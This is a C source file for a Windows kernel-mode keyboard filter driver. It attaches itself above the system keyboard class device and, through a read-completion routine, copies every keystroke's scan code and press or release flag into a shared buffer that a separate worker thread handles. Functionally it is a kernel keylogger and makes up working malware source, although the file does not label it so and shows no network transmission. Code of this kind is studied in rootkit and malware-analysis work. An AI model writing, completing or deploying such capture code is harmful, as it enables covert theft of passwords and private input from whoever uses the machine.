#include "ntddk.h"
#include "ntddkbd.h"

#include "types.h"
#include "SharedArray.h"
#include "WorkerThread.h"

//Globals
//Existing top of the device stack
PDEVICE_OBJECT deviceTopOfChain;

//Number of IRPs to be completed
DWORD nIrpsToComplete = 0;





NTSTATUS CompletionRoutine
(
	IN PDEVICE_OBJECT pDeviceObject,
	IN PIRP pIrp,
	IN PVOID Context
)
{
	/*
	Completion routine extracts keyboard data
	MakeCode indicates keyboard scan code that's associated with the key that was pressed or released
	Flags determines if the key was pressed or released	
	*/

	NTSTATUS status;
	PKEYBOARD_INPUT_DATA keys;	//Documented in DDK
	DWORD nKeys;
	
	status = pIrp->IoStatus.Status;
	if (status == STATUS_SUCCESS)
	{
		keys = (PKEYBOARD_INPUT_DATA)pIrp->AssociatedIrp.SystemBuffer;
		nKeys = (DWORD)(pIrp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA));

		for (DWORD i = 0; i < nKeys; i++)
		{
			/*
			if ((keys[i].Flags == KEY_BREAK) && (keys[i].MakeCode < SZ_TABLE))
				DbgPrint("[%s]: ScanCode : %s [%d][Released]\n", "CompletionRoutine", table[keys[i].MakeCode], keys[i].MakeCode);

			if ((keys[i].Flags == KEY_MAKE) && (keys[i].MakeCode < SZ_TABLE))
				DbgPrint("[%s]: ScanCode : %s [%d][Pressed]\n", "CompletionRoutine", table[keys[i].MakeCode], keys[i].MakeCode);
			*/

			addEntry(keys[i]);
		}
	}

	//Mark IRP if the IRP indicates that this is required
	if(pIrp->PendingReturned)
		IoMarkIrpPending(pIrp);

	//We've completed an IRP, can take it off our list
	nIrpsToComplete = nIrpsToComplete - 1;
	DbgPrint("[%s]: nIrpsToComplete = %d\n", "CompletionRoutine", nIrpsToComplete);
	
	return status;
}/*end CompletionRoutine()---------------------------------------------------------------------------------------------------------------*/








NTSTATUS InsertDriver
(
	IN PDRIVER_OBJECT pDriverObject
)
{
	/*
	Generates a corresponding filter device object and attach the filter device to the top of the device stack
	*/

	NTSTATUS status;
	PDEVICE_OBJECT pNewDeviceObject;

	//TOC ~ Current Top-Of-Chain
	CCHAR			TOCNameBuffer[128] = "\\Device\\KeyboardClass0";
	STRING			TOCNameString;
	UNICODE_STRING	TOCNameUnicodeString;

	//Creating Filter Device Object
	status = IoCreateDevice(
		pDriverObject,
		0,
		NULL,
		FILE_DEVICE_KEYBOARD,
		0,
		TRUE,
		&pNewDeviceObject
	);

	if (!NT_SUCCESS(status))
	{
		DbgPrint("[%s]: %s\n", "InsertDriver", "IoCreateDevice() failed");
		return status;
	}

	pNewDeviceObject->Flags = pNewDeviceObject->Flags | (DO_BUFFERED_IO | DO_POWER_PAGABLE);
	pNewDeviceObject->Flags = pNewDeviceObject->Flags & ~DO_DEVICE_INITIALIZING;

	RtlInitAnsiString(&TOCNameString, TOCNameBuffer);
	RtlAnsiStringToUnicodeString(&TOCNameUnicodeString, &TOCNameString, TRUE);

	status = IoAttachDevice(
		pNewDeviceObject,
		&TOCNameUnicodeString,
		&deviceTopOfChain
	);

	if (!NT_SUCCESS(status))
	{
		switch (status)
		{
		case STATUS_INVALID_PARAMETER:
			DbgPrint("[%s]: %s\n", "InsertDriver", "STATUS_INVALUD_PARAMETER");
			break;
		case STATUS_OBJECT_TYPE_MISMATCH:
			DbgPrint("[%s]: %s\n", "InsertDriver", "STATUS_OBJECT_TYPE_MISMATCH");
			break;
		case STATUS_OBJECT_NAME_INVALID:
			DbgPrint("[%s]: %s\n", "InsertDriver", "STATUS_OBJECT_NAME_INVALID");
			break;
		case STATUS_INSUFFICIENT_RESOURCES:
			DbgPrint("[%s]: %s\n", "InsertDriver", "STATUS_INSUFFICIENT_RESOURCES");
			break;
		default:
			DbgPrint("[%s]: %s\n", "InsertDriver", "IoAttachDevice() failed for unknown reasons");
		}

		return status;
	}

	RtlFreeUnicodeString(&TOCNameUnicodeString);

	DbgPrint("[%s]: %s\n", "InsertDriver", "Filter driver has been placed on top of the chain");

	return STATUS_SUCCESS;
}/*end InsertDriver()-------------------------------------------------------------------------------------------------------------------*/














NTSTATUS Irp_Mj_Read
(
	IN PDEVICE_OBJECT pDeviceObject,	//pointer to Device Object structure
	IN PIRP pIrp						//pointer to IRP
)
{
	NTSTATUS status;
	PIO_STACK_LOCATION nextLoc;

	//Initialize the IRP stack location for the next driver (by copying over the current)
	nextLoc = IoGetNextIrpStackLocation(pIrp);
	*nextLoc = *(IoGetCurrentIrpStackLocation(pIrp));

	IoSetCompletionRoutine(
		pIrp,					//IN PIRP Irp
		CompletionRoutine,		//IN PIO_COMPLETION_ROUTINE CompletionRoutine
		pDeviceObject,			//IN PVOID DriverDeterminedContext
		TRUE,					//IN BOOLEAN InvokeOnSuccess
		TRUE,					//IN BOOLEAN InvokeOnError
		TRUE					//IN BOOLEAN InvokeOnCancel
	);

	//Now we've got yet another IRP to process with our completion routine
	nIrpsToComplete = nIrpsToComplete + 1;
	DbgPrint("[%s]: Read request made, nIrpsToComplete = %d\n", "Irp_Mj_Read", nIrpsToComplete);

	//Pass IRP down
	status = IoCallDriver(deviceTopOfChain, pIrp);

	return status;
}/*end Irp_Mj_Read()-----------------------------------------------------------------------------------------------------------------*/








NTSTATUS defaultDispatch
(
	IN PDEVICE_OBJECT pDeviceObject,	//pointer to Device Object structure
	IN PIRP pIrp						//pointer to IRP
)
{
	NTSTATUS status;

	IoSkipCurrentIrpStackLocation(pIrp);
	
	status = IoCallDriver(deviceTopOfChain, pIrp);

	return status;
}/*end defaultDispatch()---------------------------------------------------------------------------------------------------------------*/






VOID OnUnload
(
	IN PDRIVER_OBJECT pDriverObject
)
{
	KTIMER timer;
	LARGE_INTEGER timeLimit;

	//Detach calling driver's device object from specified device object
	IoDetachDevice(deviceTopOfChain);

	DbgPrint("[%s]: %s\n", "OnUnload", "Filter driver has detached from chain");
	DbgPrint("[%s]: nIrpsToComplete = %d\n", "OnUnload", nIrpsToComplete);

	KeInitializeTimer(&timer);
	timeLimit.QuadPart = 1000000;	//100-nanosecond intervals = 0.1s

	//loop until all of the registered IRPs have completed
	while (nIrpsToComplete > 0)
	{
		KeSetTimer(
			&timer,
			timeLimit,
			NULL
		);

		KeWaitForSingleObject(
			&timer,
			Executive,
			KernelMode,
			FALSE,
			NULL
		);
	}

	//Delete the device mapped to this driver
	IoDeleteDevice(pDriverObject->DeviceObject);

	//Destroy worker thread
	destroyWorkerThread();

	DbgPrint("[%s]: %s\n", "OnUnload", "Driver clean-up successful");
	return;
}/*end OnUnload()-------------------------------------------------------------------------------------------------------------------*/










NTSTATUS DriverEntry
(
	IN PDRIVER_OBJECT pDriverObject,
	IN PUNICODE_STRING regPath
)
{
	NTSTATUS status;

	for (DWORD i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
		pDriverObject->MajorFunction[i] = defaultDispatch;

	pDriverObject->MajorFunction[IRP_MJ_READ] = Irp_Mj_Read;
	pDriverObject->DriverUnload = OnUnload;
	
	InsertDriver(pDriverObject);
	initSharedArray();
	initWorkerThread();

	DbgPrint("[%s]: %s\n", "DriverEntry", "DriverEntry completed without errors");
	return STATUS_SUCCESS;
}/*end DriverEntry()-----------------------------------------------------------------------------------------------------------------*/